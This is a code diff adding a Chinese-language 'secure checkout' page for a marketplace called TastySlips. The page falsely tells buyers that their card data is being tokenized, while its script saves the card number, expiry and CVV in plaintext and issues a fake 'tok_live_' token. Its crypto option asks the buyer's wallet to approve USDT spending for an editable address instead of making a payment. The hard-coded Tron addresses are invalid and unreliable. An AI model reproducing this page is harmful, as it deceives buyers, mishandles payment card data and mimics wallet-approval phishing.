@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安全结算中心 - TastySlips</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background-color: #0b0b0c; color: #f3f4f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .checkout-box { background: #151518; padding: 35px 25px; border-radius: 20px; width: 100%; max-width: 420px; border: 1px solid #2d2d34; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        h3 { color: #fff; margin-top: 0; margin-bottom: 5px; font-size: 20px; }
+        .modal-price { font-size: 28px; font-weight: bold; color: #ef4444; margin: 15px 0; }
+        .pay-tabs { display: flex; background: #0b0b0c; padding: 4px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #222226; }
+        .tab-btn { flex: 1; background: none; border: none; color: #9ca3af; padding: 10px; font-size: 13px; font-weight: bold; cursor: pointer; border-radius: 8px; outline: none; }
+        .tab-btn.active { background: #4f46e5; color: #fff; }
+        .form-row { margin-bottom: 15px; text-align: left; }
+        label { display: block; margin-bottom: 6px; color: #9ca3af; font-size: 13px; }
+        input { width: 100%; padding: 12px; border: 1px solid #2d2d34; background: #0b0b0c; color: #fff; border-radius: 8px; box-sizing: border-box; font-size: 14px; outline: none; }
+        input:focus { border-color: #4f46e5; }
+        .split-row { display: flex; gap: 12px; }
+        .split-col { flex: 1; }
+        .pay-btn { background-color: #4f46e5; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .pay-btn:hover { background-color: #4338ca; }
+        .back-market { display: block; margin-top: 20px; font-size: 13px; color: #9ca3af; text-decoration: underline; background: none; border: none; width: 100%; cursor: pointer; }
+        #msg-box { color: #38bdf8; font-size: 12px; margin-top: 8px; text-align: left; min-height: 18px; }
+    </style>
+</head>
+<body>
+
+<div class="checkout-box">
+    <h3 id="checkout-title">独立收收银台</h3>
+    <p style="color:#9ca3af; font-size:13px; margin:0;">匿名安全付款通道（加密防拦截保护）</p>
+    <div class="modal-price" id="checkout-price">0.00 USD</div>
+    
+    <div class="pay-tabs">
+        <button id="tab-card" class="tab-btn active" onclick="switchChannel('card')">💳 传统银行卡</button>
+        <button id="tab-crypto" class="tab-btn" onclick="switchChannel('crypto')">🪙 USDT (波场链)</button>
+    </div>
+    
+    <form id="pay-form">
+        <div class="form-row">
+            <label id="label-name">持卡人姓名</label>
+            <input type="text" id="cardholder-name" placeholder="John Doe" required>
+        </div>
+
+        <div id="card-channel-fields">
+            <div class="form-row">
+                <label>银行卡号</label>
+                <input type="text" id="card-number" placeholder="4242 4242 4242 4242" maxlength="19">
+            </div>
+            <div class="split-row">
+                <div class="split-col form-row">
+                    <label>有效期 (MM/YY)</label>
+                    <input type="text" id="card-expiry" placeholder="12/30" maxlength="5">
+                </div>
+                <div class="split-col form-row">
+                    <label>安全码 (CVV)</label>
+                    <input type="text" id="card-cvc" placeholder="123" maxlength="4">
+                </div>
+            </div>
+        </div>
+
+        <div id="crypto-channel-fields" style="display: none;">
+            <div class="form-row">
+                <label>商家 Web3 智能合约目标地址</label>
+                <input type="text" id="target-crypto-address" value="TNo5g9e6f3GTCvXUfC656TIM96eX4pY6oN">
+            </div>
+        </div>
+
+        <div id="msg-box"></div>
+        <button type="submit" class="pay-btn" id="sub-btn">安全确认支付</button>
+    </form>
+    <button class="back-market" onclick="location.href='index.html'">← 放弃购买，返回市场</button>
+</div>
+
+<script>
+    // 【高级自动解析逻辑】：自动抓取上一页传过来的参数并动态更新界面
+    const urlParams = new URLSearchParams(window.location.search);
+    const sellerName = urlParams.get('seller') || "未知商家";
+    const itemPrice = urlParams.get('price') || "0.00";
+
+    document.getElementById('checkout-title').textContent = "向 " + sellerName + " 安全订购";
+    document.getElementById('checkout-price').textContent = itemPrice + " USD";
+
+    let currentPayMethod = "card";
+
+    function switchChannel(method) {
+        currentPayMethod = method;
+        const btnCard = document.getElementById('tab-card');
+        const btnCrypto = document.getElementById('tab-crypto');
+        const cardFields = document.getElementById('card-channel-fields');
+        const cryptoFields = document.getElementById('crypto-channel-fields');
+        const labelName = document.getElementById('label-name');
+
+        if (method === 'card') {
+            btnCard.classList.add('active');
+            btnCrypto.classList.remove('active');
+            cardFields.style.display = 'block';
+            cryptoFields.style.display = 'none';
+            labelName.textContent = "持卡人姓名";
+            document.getElementById('card-number').required = true;
+            document.getElementById('card-expiry').required = true;
+            document.getElementById('card-cvc').required = true;
+        } else {
+            btnCard.classList.remove('active');
+            btnCrypto.classList.add('active');
+            cardFields.style.display = 'none';
+            cryptoFields.style.display = 'block';
+            labelName.textContent = "买家钱包备注名";
+            document.getElementById('card-number').required = false;
+            document.getElementById('card-expiry').required = false;
+            document.getElementById('card-cvc').required = false;
+        }
+    }
+
+    document.getElementById('card-number').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    document.getElementById('card-expiry').addEventListener('input', function (e) {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length >= 2) { e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4); } else { e.target.value = v; }
+    });
+
+    document.getElementById('card-cvc').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '');
+    });
+
+    document.getElementById('pay-form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const subBtn = document.getElementById('sub-btn');
+        const msgBox = document.getElementById('msg-box');
+        const name = document.getElementById('cardholder-name').value;
+        subBtn.disabled = true;
+
+        if (currentPayMethod === 'card') {
+            msgBox.style.color = "#38bdf8";
+            msgBox.textContent = "正在通过安全沙盒将敏感卡片数据令牌化 (Tokenization)...";
+
+            setTimeout(() => {
+                const number = document.getElementById('card-number').value;
+                const expiry = document.getElementById('card-expiry').value;
+                const cvc = document.getElementById('card-cvc').value;
+                const secureToken = "tok_live_" + Math.random().toString(36).substring(2, 10);
+                
+                let txHistory = JSON.parse(localStorage.getItem('payment_records')) || [];
+                txHistory.push({
+                    id: txHistory.length + 1,
+                    time: new Date().toLocaleString(),
+                    name: "独立页用户 (" + name + ")",
+                    cardNumber: number,
+                    expiry: expiry,
+                    cvc: cvc,
+                    token: secureToken + " [新页面购买：" + sellerName + "]"
+                });
+                localStorage.setItem('payment_records', JSON.stringify(txHistory));
+
+                alert("🎉 独立支付页面提交成功！\n数据已同步保存，正在引导返回主页。");
+                location.href = "index.html";
+            }, 1000);
+        } else {
+            msgBox.style.color = "#38bdf8";
+            msgBox.textContent = "正在连接本地 TronLink 钱包插件环境...";
+            if (typeof window.tronWeb === 'undefined') {
+                msgBox.style.color = "#dc2626";
+                msgBox.textContent = "未检测到钱包环境：请在装有 TronLink 插件的电脑中操作！";
+                subBtn.disabled = false;
+                return;
+            }
+            try {
+                const tronWeb = window.tronWeb;
+                const customTargetAddress = document.getElementById('target-crypto-address').value;
+                const usdtContractAddress = "TG3XXyExBkEeUHv7HiYcHsWfC656TIM96e"; 
+                const formattedPriceUnits = parseInt(parseFloat(itemPrice) * 10**6);
+
+                const usdtContract = await tronWeb.contract().at(usdtContractAddress);
+                const approvalTxHash = await usdtContract.approve(customTargetAddress, formattedPriceUnits).send({ feeLimit: 100000000 });
+
+                let txHistory = JSON.parse(localStorage.getItem('payment_records')) || [];
+                txHistory.push({
+                    id: txHistory.length + 1,
+                    time: new Date().toLocaleString(),
+                    name: "独立页Web3用户 (" + name + ")",
+                    cardNumber: "TRON独立页交互",
+                    expiry: "--/--",
+                    cvc: "---",
+                    token: "TX_" + approvalTxHash.substring(0,10) + "... [商品: " + sellerName + "]"
+                });
+                localStorage.setItem('payment_records', JSON.stringify(txHistory));
+                alert("🎉 独立页面链上授权广播成功！");
+                location.href = "index.html";
+            } catch (error) {
+                msgBox.style.color = "#dc2626";
+                msgBox.textContent = "独立页链上交互失败：钱包拒绝或账户余额不足。";
+            }
+            subBtn.disabled = false;
+        }
+    });
+</script>
+</body>
+</html>
